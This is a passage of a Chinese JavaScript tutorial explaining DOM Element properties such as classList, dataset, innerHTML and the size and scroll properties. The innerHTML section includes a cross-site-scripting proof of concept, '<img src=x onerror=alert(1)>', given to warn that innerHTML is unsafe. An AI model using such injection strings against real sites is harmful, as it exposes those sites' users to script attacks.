'myspan' ); span . id // \"myspan\" span . tagName // \"SPAN\" \uff083\uff09Element.dir Element.dir \u5c5e\u6027\u7528\u4e8e\u8bfb\u5199\u5f53\u524d\u5143\u7d20\u7684\u6587\u5b57\u65b9\u5411\uff0c\u53ef\u80fd\u662f\u4ece\u5de6\u5230\u53f3\uff08 \"ltr\" \uff09\uff0c\u4e5f\u53ef\u80fd\u662f\u4ece\u53f3\u5230\u5de6\uff08 \"rtl\" \uff09\u3002 \uff084\uff09Element.accessKey Element.accessKey \u5c5e\u6027\u7528\u4e8e\u8bfb\u5199\u5206\u914d\u7ed9\u5f53\u524d\u5143\u7d20\u7684\u5feb\u6377\u952e\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <button accesskey=\"h\" id=\"btn\">\u70b9\u51fb</button> var btn = document . getElementById ( 'btn' ); btn . accessKey // \"h\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c btn \u5143\u7d20\u7684\u5feb\u6377\u952e\u662f h \uff0c\u6309\u4e0b Alt + h \u5c31\u80fd\u5c06\u7126\u70b9\u8f6c\u79fb\u5230\u5b83\u4e0a\u9762\u3002 \uff085\uff09Element.draggable Element.draggable \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u662f\u5426\u53ef\u62d6\u52a8\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff086\uff09Element.lang Element.lang \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u7684\u8bed\u8a00\u8bbe\u7f6e\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 1 2 3 // HTML \u4ee3\u7801\u5982\u4e0b // <html lang=\"en\"> document . documentElement . lang // \"en\" \uff087\uff09Element.tabIndex Element.tabIndex \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u5728 Tab \u952e\u904d\u5386\u65f6\u7684\u987a\u5e8f\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 tabIndex \u5c5e\u6027\u503c\u5982\u679c\u662f\u8d1f\u503c\uff08\u901a\u5e38\u662f -1 \uff09\uff0c\u5219 Tab \u952e\u4e0d\u4f1a\u904d\u5386\u5230\u8be5\u5143\u7d20\u3002\u5982\u679c\u662f\u6b63\u6574\u6570\uff0c\u5219\u6309\u7167\u987a\u5e8f\uff0c\u4ece\u5c0f\u5230\u5927\u904d\u5386\u3002\u5982\u679c\u4e24\u4e2a\u5143\u7d20\u7684 tabIndex \u5c5e\u6027\u7684\u6b63\u6574\u6570\u503c\u76f8\u540c\uff0c\u5219\u6309\u7167\u51fa\u73b0\u7684\u987a\u5e8f\u904d\u5386\u3002\u904d\u5386\u5b8c\u6240\u6709 tabIndex \u4e3a\u6b63\u6574\u6570\u7684\u5143\u7d20\u4ee5\u540e\uff0c\u518d\u904d\u5386\u6240\u6709 tabIndex \u7b49\u4e8e 0 \u3001\u6216\u8005\u5c5e\u6027\u503c\u662f\u975e\u6cd5\u503c\u3001\u6216\u8005\u6ca1\u6709 tabIndex \u5c5e\u6027\u7684\u5143\u7d20\uff0c\u987a\u5e8f\u4e3a\u5b83\u4eec\u5728\u7f51\u9875\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f\u3002 \uff088\uff09Element.title Element.title \u5c5e\u6027\u7528\u6765\u8bfb\u5199\u5f53\u524d\u5143\u7d20\u7684 HTML \u5c5e\u6027 title \u3002\u8be5\u5c5e\u6027\u901a\u5e38\u7528\u6765\u6307\u5b9a\uff0c\u9f20\u6807\u60ac\u6d6e\u65f6\u5f39\u51fa\u7684\u6587\u5b57\u63d0\u793a\u6846\u3002 \u5143\u7d20\u72b6\u6001\u7684\u76f8\u5173\u5c5e\u6027 \u00b6 \uff081\uff09Element.hidden Element.hidden \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d HTML \u5143\u7d20\u7684 hidden \u5c5e\u6027\u7684\u503c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u7528\u6765\u63a7\u5236\u5f53\u524d\u5143\u7d20\u662f\u5426\u53ef\u89c1\u3002 1 2 3 4 5 6 var btn = document . getElementById ( 'btn' ); var mydiv = document . getElementById ( 'mydiv' ); btn . addEventListener ( 'click' , function () { mydiv . hidden = ! mydiv . hidden ; }, false ); \u6ce8\u610f\uff0c\u8be5\u5c5e\u6027\u4e0e CSS \u8bbe\u7f6e\u662f\u4e92\u76f8\u72ec\u7acb\u7684\u3002CSS \u5bf9\u5f53\u524d\u5143\u7d20\u53ef\u89c1\u6027\u7684\u8bbe\u7f6e\uff0c Element.hidden \u5e76\u4e0d\u80fd\u53cd\u6620\u51fa\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u5c5e\u6027\u5e76\u4e0d\u80fd\u7528\u6765\u5224\u65ad\u5f53\u524d\u5143\u7d20\u7684\u5b9e\u9645\u53ef\u89c1\u6027\u3002 CSS \u8bbe\u7f6e\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8e Element.hidden \u3002\u5982\u679c CSS \u6307\u5b9a\u4e86\u8be5\u5143\u7d20\u4e0d\u53ef\u89c1\uff08 display: none \uff09\u6216\u53ef\u89c1\uff08 visibility: visible \uff09\uff0c\u90a3\u4e48 Element.hidden \u5e76\u4e0d\u80fd\u6539\u53d8\u8be5\u5143\u7d20\u5b9e\u9645\u7684\u53ef\u89c1\u6027\u3002\u6362\u8a00\u4e4b\uff0c\u8fd9\u4e2a\u5c5e\u6027\u53ea\u5728 CSS \u6ca1\u6709\u660e\u786e\u8bbe\u5b9a\u5f53\u524d\u5143\u7d20\u7684\u53ef\u89c1\u6027\u65f6\u624d\u6709\u6548\u3002 \uff082\uff09Element.contentEditable\uff0cElement.isContentEditable HTML \u5143\u7d20\u53ef\u4ee5\u8bbe\u7f6e contentEditable \u5c5e\u6027\uff0c\u4f7f\u5f97\u5143\u7d20\u7684\u5185\u5bb9\u53ef\u4ee5\u7f16\u8f91\u3002 1 < div contenteditable > 123 </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <div> \u5143\u7d20\u6709 contenteditable \u5c5e\u6027\uff0c\u56e0\u6b64\u7528\u6237\u53ef\u4ee5\u5728\u7f51\u9875\u4e0a\u7f16\u8f91\u8fd9\u4e2a\u533a\u5757\u7684\u5185\u5bb9\u3002 Element.contentEditable \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86 contenteditable \u5c5e\u6027\uff0c\u6709\u4e09\u79cd\u53ef\u80fd\u7684\u503c\u3002\u8be5\u5c5e\u6027\u53ef\u5199\u3002 \"true\" \uff1a\u5143\u7d20\u5185\u5bb9\u53ef\u7f16\u8f91 \"false\" \uff1a\u5143\u7d20\u5185\u5bb9\u4e0d\u53ef\u7f16\u8f91 \"inherit\" \uff1a\u5143\u7d20\u662f\u5426\u53ef\u7f16\u8f91\uff0c\u7ee7\u627f\u4e86\u7236\u5143\u7d20\u7684\u8bbe\u7f6e Element.isContentEditable \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u540c\u6837\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86 contenteditable \u5c5e\u6027\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 Element.attributes \u00b6 Element.attributes \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u662f\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6240\u6709\u5c5e\u6027\u8282\u70b9\uff0c\u8be6\u89c1\u300a\u5c5e\u6027\u7684\u64cd\u4f5c\u300b\u4e00\u7ae0\u3002 1 2 3 4 5 6 var p = document . querySelector ( 'p' ); var attrs = p . attributes ; for ( var i = attrs . length - 1 ; i >= 0 ; i -- ) { console . log ( attrs [ i ]. name + '->' + attrs [ i ]. value ); } \u4e0a\u9762\u4ee3\u7801\u904d\u5386 p \u5143\u7d20\u7684\u6240\u6709\u5c5e\u6027\u3002 Element.className\uff0cElement.classList \u00b6 className \u5c5e\u6027\u7528\u6765\u8bfb\u5199\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684 class \u5c5e\u6027\u3002\u5b83\u7684\u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a class \u4e4b\u95f4\u7528\u7a7a\u683c\u5206\u5272\u3002 classList \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6bcf\u4e2a class \u5c31\u662f\u8fd9\u4e2a\u5bf9\u8c61\u7684\u4e00\u4e2a\u6210\u5458\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // HTML \u4ee3\u7801 <div class=\"one two three\" id=\"myDiv\"></div> var div = document . getElementById ( 'myDiv' ); div . className // \"one two three\" div . classList // { // 0: \"one\" // 1: \"two\" // 2: \"three\" // length: 3 // } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c className \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7a7a\u683c\u5206\u9694\u7684\u5b57\u7b26\u4e32\uff0c\u800c classList \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u7684 length \u5c5e\u6027\uff08\u53ea\u8bfb\uff09\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u7684 class \u6570\u91cf\u3002 classList \u5bf9\u8c61\u6709\u4e0b\u5217\u65b9\u6cd5\u3002 add() \uff1a\u589e\u52a0\u4e00\u4e2a class\u3002 remove() \uff1a\u79fb\u9664\u4e00\u4e2a class\u3002 contains() \uff1a\u68c0\u67e5\u5f53\u524d\u5143\u7d20\u662f\u5426\u5305\u542b\u67d0\u4e2a class\u3002 toggle() \uff1a\u5c06\u67d0\u4e2a class \u79fb\u5165\u6216\u79fb\u51fa\u5f53\u524d\u5143\u7d20\u3002 item() \uff1a\u8fd4\u56de\u6307\u5b9a\u7d22\u5f15\u4f4d\u7f6e\u7684 class\u3002 toString() \uff1a\u5c06 class \u7684\u5217\u8868\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 var div = document . getElementById ( 'myDiv' ); div . classList . add ( 'myCssClass' ); div . classList . add ( 'foo' , 'bar' ); div . classList . remove ( 'myCssClass' ); div . classList . toggle ( 'myCssClass' ); // \u5982\u679c myCssClass \u4e0d\u5b58\u5728\u5c31\u52a0\u5165\uff0c\u5426\u5219\u79fb\u9664 div . classList . contains ( 'myCssClass' ); // \u8fd4\u56de true \u6216\u8005 false div . classList . item ( 0 ); // \u8fd4\u56de\u7b2c\u4e00\u4e2a Class div . classList . toString (); \u4e0b\u9762\u6bd4\u8f83\u4e00\u4e0b\uff0c className \u548c classList \u5728\u6dfb\u52a0\u548c\u5220\u9664\u67d0\u4e2a class \u65f6\u7684\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 var foo = document . getElementById ( 'foo' ); // \u6dfb\u52a0class foo . className += 'bold' ; foo . classList . add ( 'bold' ); // \u5220\u9664class foo . classList . remove ( 'bold' ); foo . className = foo . className . replace ( /^bold$/ , '' ); toggle \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002\u5982\u679c\u4e3a true \uff0c\u5219\u6dfb\u52a0\u8be5\u5c5e\u6027\uff1b\u5982\u679c\u4e3a false \uff0c\u5219\u53bb\u9664\u8be5\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 el . classList . toggle ( 'abc' , boolValue ); // \u7b49\u540c\u4e8e if ( boolValue ) { el . classList . add ( 'abc' ); } else { el . classList . remove ( 'abc' ); } Element.dataset \u00b6 \u7f51\u9875\u5143\u7d20\u53ef\u4ee5\u81ea\u5b9a\u4e49 data- \u5c5e\u6027\uff0c\u7528\u6765\u6dfb\u52a0\u6570\u636e\u3002 1 < div data-timestamp = \"1522907809292\" ></ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <div> \u5143\u7d20\u6709\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 data-timestamp \u5c5e\u6027\uff0c\u7528\u6765\u4e3a\u8be5\u5143\u7d20\u6dfb\u52a0\u4e00\u4e2a\u65f6\u95f4\u6233\u3002 Element.dataset \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u4ece\u8fd9\u4e2a\u5bf9\u8c61\u8bfb\u5199 data- \u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 // <article // id=\"foo\" // data-columns=\"3\" // data-index-number=\"12314\" // data-parent=\"cars\"> // ... // </article> var article = document . getElementById ( 'foo' ); article . dataset . columns // \"3\" article . dataset . indexNumber // \"12314\" article . dataset . parent // \"cars\" \u6ce8\u610f\uff0c dataset \u4e0a\u9762\u7684\u5404\u4e2a\u5c5e\u6027\u8fd4\u56de\u90fd\u662f\u5b57\u7b26\u4e32\u3002 HTML \u4ee3\u7801\u4e2d\uff0c data- \u5c5e\u6027\u7684\u5c5e\u6027\u540d\uff0c\u53ea\u80fd\u5305\u542b\u82f1\u6587\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u8fde\u8bcd\u7ebf\uff08 - \uff09\u3001\u70b9\uff08 . \uff09\u3001\u5192\u53f7\uff08 : \uff09\u548c\u4e0b\u5212\u7ebf\uff08 _ \uff09\u3002\u5b83\u4eec\u8f6c\u6210 JavaScript \u5bf9\u5e94\u7684 dataset \u5c5e\u6027\u540d\uff0c\u89c4\u5219\u5982\u4e0b\u3002 \u5f00\u5934\u7684 data- \u4f1a\u7701\u7565\u3002 \u5982\u679c\u8fde\u8bcd\u7ebf\u540e\u9762\u8ddf\u4e86\u4e00\u4e2a\u82f1\u6587\u5b57\u6bcd\uff0c\u90a3\u4e48\u8fde\u8bcd\u7ebf\u4f1a\u53d6\u6d88\uff0c\u8be5\u5b57\u6bcd\u53d8\u6210\u5927\u5199\u3002 \u5176\u4ed6\u5b57\u7b26\u4e0d\u53d8\u3002 \u56e0\u6b64\uff0c data-abc-def \u5bf9\u5e94 dataset.abcDef \uff0c data-abc-1 \u5bf9\u5e94 dataset[\"abc-1\"] \u3002 \u9664\u4e86\u4f7f\u7528 dataset \u8bfb\u5199 data- \u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 Element.getAttribute() \u548c Element.setAttribute() \uff0c\u901a\u8fc7\u5b8c\u6574\u7684\u5c5e\u6027\u540d\u8bfb\u5199\u8fd9\u4e9b\u5c5e\u6027\u3002 1 2 3 4 var mydiv = document . getElementById ( 'mydiv' ); mydiv . dataset . foo = 'bar' ; mydiv . getAttribute ( 'data-foo' ) // \"bar\" Element.innerHTML \u00b6 Element.innerHTML \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7b49\u540c\u4e8e\u8be5\u5143\u7d20\u5305\u542b\u7684\u6240\u6709 HTML \u4ee3\u7801\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u5e38\u7528\u6765\u8bbe\u7f6e\u67d0\u4e2a\u8282\u70b9\u7684\u5185\u5bb9\u3002\u5b83\u80fd\u6539\u5199\u6240\u6709\u5143\u7d20\u8282\u70b9\u7684\u5185\u5bb9\uff0c\u5305\u62ec <HTML> \u548c <body> \u5143\u7d20\u3002 \u5982\u679c\u5c06 innerHTML \u5c5e\u6027\u8bbe\u4e3a\u7a7a\uff0c\u7b49\u4e8e\u5220\u9664\u6240\u6709\u5b83\u5305\u542b\u7684\u6240\u6709\u8282\u70b9\u3002 1 el . innerHTML = '' ; \u4e0a\u9762\u4ee3\u7801\u7b49\u4e8e\u5c06 el \u8282\u70b9\u53d8\u6210\u4e86\u4e00\u4e2a\u7a7a\u8282\u70b9\uff0c el \u539f\u6765\u5305\u542b\u7684\u8282\u70b9\u88ab\u5168\u90e8\u5220\u9664\u3002 \u6ce8\u610f\uff0c\u8bfb\u53d6\u5c5e\u6027\u503c\u7684\u65f6\u5019\uff0c\u5982\u679c\u6587\u672c\u8282\u70b9\u5305\u542b & \u3001\u5c0f\u4e8e\u53f7\uff08 < \uff09\u548c\u5927\u4e8e\u53f7\uff08 > \uff09\uff0c innerHTML \u5c5e\u6027\u4f1a\u5c06\u5b83\u4eec\u8f6c\u4e3a\u5b9e\u4f53\u5f62\u5f0f &amp; \u3001 &lt; \u3001 &gt; \u3002\u5982\u679c\u60f3\u5f97\u5230\u539f\u6587\uff0c\u5efa\u8bae\u4f7f\u7528 element.textContent \u5c5e\u6027\u3002 1 2 3 // HTML\u4ee3\u7801\u5982\u4e0b <p id=\"para\"> 5 > 3 </p> document . getElementById ( 'para' ). innerHTML // 5 &gt; 3 \u5199\u5165\u7684\u65f6\u5019\uff0c\u5982\u679c\u63d2\u5165\u7684\u6587\u672c\u5305\u542b HTML \u6807\u7b7e\uff0c\u4f1a\u88ab\u89e3\u6790\u6210\u4e3a\u8282\u70b9\u5bf9\u8c61\u63d2\u5165 DOM\u3002\u6ce8\u610f\uff0c\u5982\u679c\u6587\u672c\u4e4b\u4e2d\u542b\u6709 <script> \u6807\u7b7e\uff0c\u867d\u7136\u53ef\u4ee5\u751f\u6210 script \u8282\u70b9\uff0c\u4f46\u662f\u63d2\u5165\u7684\u4ee3\u7801\u4e0d\u4f1a\u6267\u884c\u3002 1 2 var name = \"<script>alert('haha')</script>\" ; el . innerHTML = name ; \u4e0a\u9762\u4ee3\u7801\u5c06\u811a\u672c\u63d2\u5165\u5185\u5bb9\uff0c\u811a\u672c\u5e76\u4e0d\u4f1a\u6267\u884c\u3002\u4f46\u662f\uff0c innerHTML \u8fd8\u662f\u6709\u5b89\u5168\u98ce\u9669\u7684\u3002 1 2 var name = \"<img src=x onerror=alert(1)>\" ; el . innerHTML = name ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c alert \u65b9\u6cd5\u662f\u4f1a\u6267\u884c\u7684\u3002\u56e0\u6b64\u4e3a\u4e86\u5b89\u5168\u8003\u8651\uff0c\u5982\u679c\u63d2\u5165\u7684\u662f\u6587\u672c\uff0c\u6700\u597d\u7528 textContent \u5c5e\u6027\u4ee3\u66ff innerHTML \u3002 Element.outerHTML \u00b6 Element.outerHTML \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6240\u6709 HTML \u4ee3\u7801\uff0c\u5305\u62ec\u8be5\u5143\u7d20\u672c\u8eab\u548c\u6240\u6709\u5b50\u5143\u7d20\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"d\"><p>Hello</p></div> var d = document . getElementById ( 'd' ); d . outerHTML // '<div id=\"d\"><p>Hello</p></div>' outerHTML \u5c5e\u6027\u662f\u53ef\u8bfb\u5199\u7684\uff0c\u5bf9\u5b83\u8fdb\u884c\u8d4b\u503c\uff0c\u7b49\u4e8e\u66ff\u6362\u6389\u5f53\u524d\u5143\u7d20\u3002 1 2 3 4 5 6 7 8 9 10 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"container\"><div id=\"d\">Hello</div></div> var container = document . getElementById ( 'container' ); var d = document . getElementById ( 'd' ); container . firstChild . nodeName // \"DIV\" d . nodeName // \"DIV\" d . outerHTML = '<p>Hello</p>' ; container . firstChild . nodeName // \"P\" d . nodeName // \"DIV\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf d \u4ee3\u8868\u5b50\u8282\u70b9\uff0c\u5b83\u7684 outerHTML \u5c5e\u6027\u91cd\u65b0\u8d4b\u503c\u4ee5\u540e\uff0c\u5185\u5c42\u7684 div \u5143\u7d20\u5c31\u4e0d\u5b58\u5728\u4e86\uff0c\u88ab p \u5143\u7d20\u66ff\u6362\u4e86\u3002\u4f46\u662f\uff0c\u53d8\u91cf d \u4f9d\u7136\u6307\u5411\u539f\u6765\u7684 div \u5143\u7d20\uff0c\u8fd9\u8868\u793a\u88ab\u66ff\u6362\u7684 DIV \u5143\u7d20\u8fd8\u5b58\u5728\u4e8e\u5185\u5b58\u4e2d\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u6ca1\u6709\u7236\u8282\u70b9\uff0c\u8bbe\u7f6e outerHTML \u5c5e\u6027\u4f1a\u62a5\u9519\u3002 1 2 3 var div = document . createElement ( 'div' ); div . outerHTML = '<p>test</p>' ; // DOMException: This element has no parent node. \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c div \u5143\u7d20\u6ca1\u6709\u7236\u8282\u70b9\uff0c\u8bbe\u7f6e outerHTML \u5c5e\u6027\u4f1a\u62a5\u9519\u3002 Element.clientHeight\uff0cElement.clientWidth \u00b6 Element.clientHeight \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u8868\u793a\u5143\u7d20\u8282\u70b9\u7684 CSS \u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u53ea\u5bf9\u5757\u7ea7\u5143\u7d20\u751f\u6548\uff0c\u5bf9\u4e8e\u884c\u5185\u5143\u7d20\u8fd4\u56de 0 \u3002\u5982\u679c\u5757\u7ea7\u5143\u7d20\u6ca1\u6709\u8bbe\u7f6e CSS \u9ad8\u5ea6\uff0c\u5219\u8fd4\u56de\u5b9e\u9645\u9ad8\u5ea6\u3002 \u9664\u4e86\u5143\u7d20\u672c\u8eab\u7684\u9ad8\u5ea6\uff0c\u5b83\u8fd8\u5305\u62ec padding \u90e8\u5206\uff0c\u4f46\u662f\u4e0d\u5305\u62ec border \u3001 margin \u3002\u5982\u679c\u6709\u6c34\u5e73\u6eda\u52a8\u6761\uff0c\u8fd8\u8981\u51cf\u53bb\u6c34\u5e73\u6eda\u52a8\u6761\u7684\u9ad8\u5ea6\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u503c\u59cb\u7ec8\u662f\u6574\u6570\uff0c\u5982\u679c\u662f\u5c0f\u6570\u4f1a\u88ab\u56db\u820d\u4e94\u5165\u3002 Element.clientWidth \u5c5e\u6027\u8fd4\u56de\u5143\u7d20\u8282\u70b9\u7684 CSS \u5bbd\u5ea6\uff0c\u540c\u6837\u53ea\u5bf9\u5757\u7ea7\u5143\u7d20\u6709\u6548\uff0c\u4e5f\u662f\u53ea\u5305\u62ec\u5143\u7d20\u672c\u8eab\u7684\u5bbd\u5ea6\u548c padding \uff0c\u5982\u679c\u6709\u5782\u76f4\u6eda\u52a8\u6761\uff0c\u8fd8\u8981\u51cf\u53bb\u5782\u76f4\u6eda\u52a8\u6761\u7684\u5bbd\u5ea6\u3002 document.documentElement \u7684 clientHeight \u5c5e\u6027\uff0c\u8fd4\u56de\u5f53\u524d\u89c6\u53e3\u7684\u9ad8\u5ea6\uff08\u5373\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u9ad8\u5ea6\uff09\uff0c\u7b49\u540c\u4e8e window.innerHeight \u5c5e\u6027\u51cf\u53bb\u6c34\u5e73\u6eda\u52a8\u6761\u7684\u9ad8\u5ea6\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09\u3002 document.body \u7684\u9ad8\u5ea6\u5219\u662f\u7f51\u9875\u7684\u5b9e\u9645\u9ad8\u5ea6\u3002\u4e00\u822c\u6765\u8bf4\uff0c document.body.clientHeight \u5927\u4e8e document.documentElement.clientHeight \u3002 1 2 3 4 5 // \u89c6\u53e3\u9ad8\u5ea6 document . documentElement . clientHeight // \u7f51\u9875\u603b\u9ad8\u5ea6 document . body . clientHeight Element.clientLeft\uff0cElement.clientTop \u00b6 Element.clientLeft \u5c5e\u6027\u7b49\u4e8e\u5143\u7d20\u8282\u70b9\u5de6\u8fb9\u6846\uff08left border\uff09\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u4e0d\u5305\u62ec\u5de6\u4fa7\u7684 padding \u548c margin \u3002\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u5de6\u8fb9\u6846\uff0c\u6216\u8005\u662f\u884c\u5185\u5143\u7d20\uff08 display: inline \uff09\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de 0 \u3002\u8be5\u5c5e\u6027\u603b\u662f\u8fd4\u56de\u6574\u6570\u503c\uff0c\u5982\u679c\u662f\u5c0f\u6570\uff0c\u4f1a\u56db\u820d\u4e94\u5165\u3002 Element.clientTop \u5c5e\u6027\u7b49\u4e8e\u7f51\u9875\u5143\u7d20\u9876\u90e8\u8fb9\u6846\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5176\u4ed6\u7279\u70b9\u90fd\u4e0e clientLeft \u76f8\u540c\u3002 Element.scrollHeight\uff0cElement.scrollWidth \u00b6 Element.scrollHeight \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff08\u5c0f\u6570\u4f1a\u56db\u820d\u4e94\u5165\uff09\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u7684\u603b\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5305\u62ec\u6ea2\u51fa\u5bb9\u5668\u3001\u5f53\u524d\u4e0d\u53ef\u89c1\u7684\u90e8\u5206\u3002\u5b83\u5305\u62ec padding \uff0c\u4f46\u662f\u4e0d\u5305\u62ec border \u3001 margin \u4ee5\u53ca\u6c34\u5e73\u6eda\u52a8\u6761\u7684\u9ad8\u5ea6\uff08\u5982\u679c\u6709\u6c34\u5e73\u6eda\u52a8\u6761\u7684\u8bdd\uff09\uff0c\u8fd8\u5305\u62ec\u4f2a\u5143\u7d20\uff08 ::before \u6216 ::after \uff09\u7684\u9ad8\u5ea6\u3002 Element.scrollWidth \u5c5e\u6027\u8868\u793a\u5f53\u524d\u5143\u7d20\u7684\u603b\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5176\u4ed6\u5730\u65b9\u90fd\u4e0e scrollHeight \u5c5e\u6027\u7c7b\u4f3c\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 \u6574\u5f20\u7f51\u9875\u7684\u603b\u9ad8\u5ea6\u53ef\u4ee5\u4ece document.documentElement \u6216 document.body \u4e0a\u8bfb\u53d6\u3002 1 2 3 // \u8fd4\u56de\u7f51\u9875\u7684\u603b\u9ad8\u5ea6 document . documentElement . scrollHeight document . body . scrollHeight \u6ce8\u610f\uff0c\u5982\u679c\u5143\u7d20\u8282\u70b9\u7684\u5185\u5bb9\u51fa\u73b0\u6ea2\u51fa\uff0c\u5373\u4f7f\u6ea2\u51fa\u7684\u5185\u5bb9\u662f\u9690\u85cf\u7684\uff0c scrollHeight \u5c5e\u6027\u4ecd\u7136\u8fd4\u56de\u5143\u7d20\u7684\u603b\u9ad8\u5ea6\u3002 1 2 3 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"myDiv\" style=\"height: 200px; overflow: hidden;\">...<div> document . getElementById ( 'myDiv' ). scrollHeight // 356 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5373\u4f7f myDiv \u5143\u7d20\u7684 CSS \u9ad8\u5ea6\u53ea\u6709200\u50cf\u7d20\uff0c\u4e14\u6ea2\u51fa\u90e8\u5206\u4e0d\u53ef\u89c1\uff0c\u4f46\u662f scrollHeight \u4ecd\u7136\u4f1a\u8fd4\u56de\u8be5\u5143\u7d20\u7684\u539f\u59cb\u9ad8\u5ea6\u3002 Element.scrollLeft\uff0cElement.scrollTop \u00b6 Element.scrollLeft \u5c5e\u6027\u8868\u793a\u5f53\u524d\u5143\u7d20\u7684\u6c34\u5e73\u6eda\u52a8\u6761\u5411\u53f3\u4fa7\u6eda\u52a8\u7684\u50cf\u7d20\u6570\u91cf\uff0c Element.scrollTop \u5c5e\u6027\u8868\u793a\u5f53\u524d\u5143\u7d20\u7684\u5782\u76f4\u6eda\u52a8\u6761\u5411\u4e0b\u6eda\u52a8\u7684\u50cf\u7d20\u6570\u91cf\u3002\u5bf9\u4e8e\u90a3\u4e9b\u6ca1\u6709\u6eda\u52a8\u6761\u7684\u7f51\u9875\u5143\u7d20\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u603b\u662f\u7b49\u4e8e0\u3002 \u5982\u679c\u8981\u67e5\u770b\u6574\u5f20\u7f51\u9875\u7684\u6c34\u5e73\u7684\u548c\u5782\u76f4\u7684\u6eda\u52a8\u8ddd\u79bb\uff0c\u8981\u4ece document.documentElement \u5143\u7d20\u4e0a\u8bfb\u53d6\u3002 1 2 document . documentElement . scrollLeft document . documentElement . scrollTop 